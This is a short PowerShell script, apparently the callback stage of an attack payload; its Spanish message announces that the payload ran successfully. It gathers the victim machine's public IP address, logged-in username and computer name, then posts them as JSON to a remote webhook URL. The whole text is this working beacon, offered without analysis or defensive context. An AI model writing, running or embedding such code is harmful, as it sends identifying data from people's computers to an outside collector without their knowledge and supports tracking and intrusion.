$url = "https://webhooksite.net/3fa59b0e-4157-4c9e-a72b-4803657bd464"
$body = @{
    message = "Payload ejecutado con éxito"
    ip = (Invoke-RestMethod http://ipinfo.io/json).ip
    user = $env:USERNAME
    computer = $env:COMPUTERNAME
}
Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
